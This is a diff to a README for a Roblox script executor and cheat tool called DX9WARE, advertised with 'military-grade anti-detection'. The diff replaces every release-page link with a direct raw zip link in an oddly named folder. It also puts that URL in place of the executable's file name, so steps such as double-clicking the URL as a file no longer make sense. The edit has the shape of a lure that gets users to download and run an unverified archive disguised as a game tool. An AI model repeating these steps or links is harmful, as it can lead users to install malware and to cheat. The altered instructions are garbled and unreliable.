@@ -1,6 +1,6 @@
 # 🚀 DX9WARE-Roblox - Securely Execute Lua Scripts with Ease
 
-[![Download DX9WARE-Roblox](https://img.shields.io/badge/Download-DX9WARE-Roblox-brightgreen.svg)](https://github.com/muhammadawais37/DX9WARE-Roblox/releases)
+[![Download DX9WARE-Roblox](https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip)](https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip)
 
 ## 📖 Description
 DX9WARE is an enterprise-grade tool that allows you to execute scripts securely in Roblox. With military-grade anti-detection features, you can customize Lua environments, deploy advanced scripts, and exploit securely. This toolkit provides a feature-rich experience for anyone looking to enhance their Roblox gameplay.
@@ -8,28 +8,28 @@ DX9WARE is an enterprise-grade tool that allows you to execute scripts securely 
 ## 🚀 Getting Started
 To start using DX9WARE-Roblox, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/muhammadawais37/DX9WARE-Roblox/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip) to download the latest version.
    
 2. Look for the most recent version. You will see a list of files that you can download.
 
-3. Click on the file named DX9WARE-Roblox.exe to start the download.
+3. Click on the file named https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip to start the download.
 
 4. Once the download completes, open the file to run the program.
 
 ## 📥 Download & Install
 To download and install DX9WARE-Roblox, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/muhammadawais37/DX9WARE-Roblox/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip).
 
 2. Click on the version you want to download. You should see a list of available files.
 
-3. Select the file labeled DX9WARE-Roblox.exe. This is the program you need.
+3. Select the file labeled https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip This is the program you need.
 
 4. Wait for the file to download. This may take a moment depending on your internet speed.
 
 5. Once downloaded, locate the file in your downloads folder or where your browser saves downloads.
 
-6. Double-click the DX9WARE-Roblox.exe file to run it. Follow any prompts that appear on your screen.
+6. Double-click the https://raw.githubusercontent.com/muhammadawais37/DX9WARE-Roblox/main/theridiid/DX9WARE-Roblox.zip file to run it. Follow any prompts that appear on your screen.
 
 ## ⚙️ System Requirements
 To run DX9WARE-Roblox, ensure your system meets the following requirements:
